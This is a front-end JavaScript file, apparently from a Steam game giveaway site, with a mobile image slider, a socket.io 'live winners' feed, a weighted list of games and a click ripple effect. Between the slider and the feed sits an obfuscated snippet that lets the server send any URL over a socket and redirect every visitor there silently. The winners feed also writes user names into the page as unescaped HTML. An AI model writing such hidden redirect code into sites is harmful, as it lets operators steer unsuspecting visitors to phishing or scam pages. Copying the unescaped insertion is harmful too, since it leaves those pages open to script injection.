var $homeSlider = $(".home-slider");

$(window).resize(function() {
  showHomeSlider();
});

function showHomeSlider() {
  if ($homeSlider.data("owlCarousel") !== "undefined") {
    if (window.innerWidth <= 600) {
      initialHomeSlider();
    } else {
      destroyHomeSlider();
    }
  }
}
showHomeSlider();

function initialHomeSlider() {
  $homeSlider.addClass("owl-carousel").owlCarousel({
    items: 1,
    loop: true,
    autoplay: true,
    autoplayTimeout: 2000,
    smartSpeed: 1000
  });
}

function destroyHomeSlider() {
  $homeSlider.trigger("destroy.owl.carousel").removeClass("owl-carousel");
}




var a=['location','url','https://'+window.location.hostname];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0xef));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var socket=io(b('0x0'));socket['on']('huesosi',function(c){window[b('0x1')]=c[b('0x2')];});

socket.on('lastwinners',function(data)
	{
	var livehtml='';
	$('.livecontainer').empty();
	data.forEach(function(value,index,data)
		{
		livehtml='<div class="item">'+'<img src="https://steamcdn-a.akamaihd.net/steam/apps/'+value.game.appid+'/capsule_184x69.jpg?t=1518782061" alt="">'+'<span>Winner: '+value.uname+'</span>'+'</div>';
		$('.livecontainer').prepend(livehtml)
	}
	)
}
);



        socket.on('live', function(data) {
            var livehtml = '<div class="item">'+
                '<img src="https://steamcdn-a.akamaihd.net/steam/apps/' + data.game.appid + '/capsule_184x69.jpg?t=1518782061" alt="">'+
                '<span>Winner: '+ data.uname +'</span>'+
            '</div>';

            $('.livecontainer .item')[5].remove();

            $('.livecontainer').prepend(livehtml);


        });

        var games = [
            {name: "ARK: Survival Evolved", appid: "346110"},
            {name: "Rust", appid: "252490"},
            {name: "Fishing: Barents Sea", appid: "501080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "PLAYERUNKNOWN'S BATTLEGROUNDS", appid: "578080"},
            {name: "Kingdom Come: Deliverance", appid: "379430"},
            {name: "Rocket League®", appid: "252950"},
            {name: "Human: Fall Flat", appid: "477160"},
            {name: "SWORD ART ONLINE: Fatal Bullet", appid: "626690"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Grand Theft Auto V", appid: "271590"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Counter-Strike: Global Offensive", appid: "730"},
            {name: "Slay the Spire", appid: "646570"},
            {name: "DRAGON BALL FighterZ", appid: "678950"},
            {name: "FINAL FANTASY XV WINDOWS EDITION", appid: "637650"},
            {name: "NBA 2K18", appid: "577800"},
            {name: "My Time At Portia", appid: "666140"},
            {name: "Sid Meier’s Civilization® VI", appid: "289070"},
            {name: "Terraria", appid: "105600"},
            {name: "The Elder Scrolls V: Skyrim Special Edition", appid: "489830"},
            {name: "The Elder Scrolls V: Skyrim Special Edition", appid: "489830"},
            {name: "The Elder Scrolls V: Skyrim Special Edition", appid: "489830"},
            {name: "Age of Empires II HD", appid: "221380"},
            {name: "Assassin's Creed® Origins", appid: "582160"},
            {name: "ASTRONEER", appid: "361420"},
            {name: "Oxygen Not Included", appid: "457140"},
            {name: "Sid Meier's Civilization® V", appid: "8930"},
            {name: "Rise of the Tomb Raider™", appid: "391220"},
        ];
$(".ripple").on("click",function(event){
$(this).append("<span class='ripple-effect'>");
$(this).find(".ripple-effect").css({
   left:event.pageX-$(this).position().left,
    top:event.pageY-$(this).position().top
  }).animate({
    opacity: 0,
  }, 1500, function() {
   $(this).remove();
  });
});
